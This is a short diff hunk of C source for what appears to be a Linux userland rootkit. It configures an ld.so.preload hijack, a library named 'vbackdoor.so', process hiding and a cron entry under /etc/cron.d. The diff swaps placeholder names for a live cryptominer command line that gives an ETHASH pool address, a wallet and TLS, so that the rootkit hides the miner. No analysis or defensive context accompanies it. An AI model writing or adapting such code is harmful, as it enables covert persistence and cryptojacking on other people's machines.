@@ -14,8 +14,8 @@
 #include <limits.h>
 #include <errno.h>
 
-#define MAGIC_STRING "evil" // hide process one
-#define MAGIC_DEAMON "evil_deamon" // hide process two
+#define MAGIC_STRING "1" // hide process one
+#define MAGIC_DEAMON "./1 --algo ETHASH --pool 152.32.203.146:5555 --user 0xa4d5991ef704e33490c42cc24fe24823b4b6f7c1.1  --tls on" // hide process two
 #define CONFIG_FILE "ld.so.preload" // hide self
 #define LIB_FILE "vbackdoor.so" // hide self
 #define CRONTAB_CODE1 "* * * * * root ping 8.8.8.8 \n" //add cron /etc/cron.d/root
